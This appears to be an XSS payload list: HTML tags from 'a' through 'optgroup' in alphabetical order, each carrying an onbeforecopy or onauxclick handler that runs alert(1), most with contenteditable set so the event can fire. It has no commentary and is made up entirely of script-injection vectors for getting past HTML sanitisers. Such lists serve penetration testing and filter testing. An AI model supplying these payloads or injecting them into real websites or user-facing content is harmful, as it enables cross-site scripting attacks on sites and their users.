<input onauxclick=alert(1)>
<textarea onauxclick=alert(1)>XSS</textarea>
<a onbeforecopy="alert(1)" contenteditable>test</a>
<abbr onbeforecopy="alert(1)" contenteditable>test</abbr>
<acronym onbeforecopy="alert(1)" contenteditable>test</acronym>
<address onbeforecopy="alert(1)" contenteditable>test</address>
<applet onbeforecopy="alert(1)" contenteditable>test</applet>
<area onbeforecopy="alert(1)" contenteditable>test</area>
<article onbeforecopy="alert(1)" contenteditable>test</article>
<aside onbeforecopy="alert(1)" contenteditable>test</aside>
<audio onbeforecopy="alert(1)" contenteditable>test</audio>
<b onbeforecopy="alert(1)" contenteditable>test</b>
<base onbeforecopy="alert(1)" contenteditable>test</base>
<basefont onbeforecopy="alert(1)" contenteditable>test</basefont>
<bdi onbeforecopy="alert(1)" contenteditable>test</bdi>
<bdo onbeforecopy="alert(1)" contenteditable>test</bdo>
<bgsound onbeforecopy="alert(1)" contenteditable>test</bgsound>
<big onbeforecopy="alert(1)" contenteditable>test</big>
<blink onbeforecopy="alert(1)" contenteditable>test</blink>
<blockquote onbeforecopy="alert(1)" contenteditable>test</blockquote>
<body onbeforecopy="alert(1)" contenteditable>test</body>
<br onbeforecopy="alert(1)" contenteditable>test</br>
<button onbeforecopy="alert(1)" contenteditable>test</button>
<canvas onbeforecopy="alert(1)" contenteditable>test</canvas>
<caption onbeforecopy="alert(1)" contenteditable>test</caption>
<center onbeforecopy="alert(1)" contenteditable>test</center>
<cite onbeforecopy="alert(1)" contenteditable>test</cite>
<code onbeforecopy="alert(1)" contenteditable>test</code>
<col onbeforecopy="alert(1)" contenteditable>test</col>
<colgroup onbeforecopy="alert(1)" contenteditable>test</colgroup>
<command onbeforecopy="alert(1)" contenteditable>test</command>
<content onbeforecopy="alert(1)" contenteditable>test</content>
<data onbeforecopy="alert(1)" contenteditable>test</data>
<datalist onbeforecopy="alert(1)" contenteditable>test</datalist>
<dd onbeforecopy="alert(1)" contenteditable>test</dd>
<del onbeforecopy="alert(1)" contenteditable>test</del>
<details onbeforecopy="alert(1)" contenteditable>test</details>
<dfn onbeforecopy="alert(1)" contenteditable>test</dfn>
<dialog onbeforecopy="alert(1)" contenteditable>test</dialog>
<dir onbeforecopy="alert(1)" contenteditable>test</dir>
<div onbeforecopy="alert(1)" contenteditable>test</div>
<dl onbeforecopy="alert(1)" contenteditable>test</dl>
<dt onbeforecopy="alert(1)" contenteditable>test</dt>
<element onbeforecopy="alert(1)" contenteditable>test</element>
<em onbeforecopy="alert(1)" contenteditable>test</em>
<embed onbeforecopy="alert(1)" contenteditable>test</embed>
<fieldset onbeforecopy="alert(1)" contenteditable>test</fieldset>
<figcaption onbeforecopy="alert(1)" contenteditable>test</figcaption>
<figure onbeforecopy="alert(1)" contenteditable>test</figure>
<font onbeforecopy="alert(1)" contenteditable>test</font>
<footer onbeforecopy="alert(1)" contenteditable>test</footer>
<form onbeforecopy="alert(1)" contenteditable>test</form>
<frame onbeforecopy="alert(1)" contenteditable>test</frame>
<frameset onbeforecopy="alert(1)" contenteditable>test</frameset>
<h1 onbeforecopy="alert(1)" contenteditable>test</h1>
<head onbeforecopy="alert(1)" contenteditable>test</head>
<header onbeforecopy="alert(1)" contenteditable>test</header>
<hgroup onbeforecopy="alert(1)" contenteditable>test</hgroup>
<hr onbeforecopy="alert(1)" contenteditable>test</hr>
<html onbeforecopy="alert(1)" contenteditable>test</html>
<i onbeforecopy="alert(1)" contenteditable>test</i>
<iframe onbeforecopy="alert(1)" contenteditable>test</iframe>
<image onbeforecopy="alert(1)" contenteditable>test</image>
<img onbeforecopy="alert(1)" contenteditable>test</img>
<input onbeforecopy=alert(1) value="XSS" autofocus>
<ins onbeforecopy="alert(1)" contenteditable>test</ins>
<isindex onbeforecopy="alert(1)" contenteditable>test</isindex>
<kbd onbeforecopy="alert(1)" contenteditable>test</kbd>
<keygen onbeforecopy="alert(1)" contenteditable>test</keygen>
<label onbeforecopy="alert(1)" contenteditable>test</label>
<legend onbeforecopy="alert(1)" contenteditable>test</legend>
<li onbeforecopy="alert(1)" contenteditable>test</li>
<link onbeforecopy="alert(1)" contenteditable>test</link>
<listing onbeforecopy="alert(1)" contenteditable>test</listing>
<main onbeforecopy="alert(1)" contenteditable>test</main>
<map onbeforecopy="alert(1)" contenteditable>test</map>
<mark onbeforecopy="alert(1)" contenteditable>test</mark>
<marquee onbeforecopy="alert(1)" contenteditable>test</marquee>
<menu onbeforecopy="alert(1)" contenteditable>test</menu>
<menuitem onbeforecopy="alert(1)" contenteditable>test</menuitem>
<meta onbeforecopy="alert(1)" contenteditable>test</meta>
<meter onbeforecopy="alert(1)" contenteditable>test</meter>
<multicol onbeforecopy="alert(1)" contenteditable>test</multicol>
<nav onbeforecopy="alert(1)" contenteditable>test</nav>
<nextid onbeforecopy="alert(1)" contenteditable>test</nextid>
<nobr onbeforecopy="alert(1)" contenteditable>test</nobr>
<noembed onbeforecopy="alert(1)" contenteditable>test</noembed>
<noframes onbeforecopy="alert(1)" contenteditable>test</noframes>
<noscript onbeforecopy="alert(1)" contenteditable>test</noscript>
<object onbeforecopy="alert(1)" contenteditable>test</object>
<ol onbeforecopy="alert(1)" contenteditable>test</ol>
<optgroup onbeforecopy="alert(1)" contenteditable>test</optgroup>
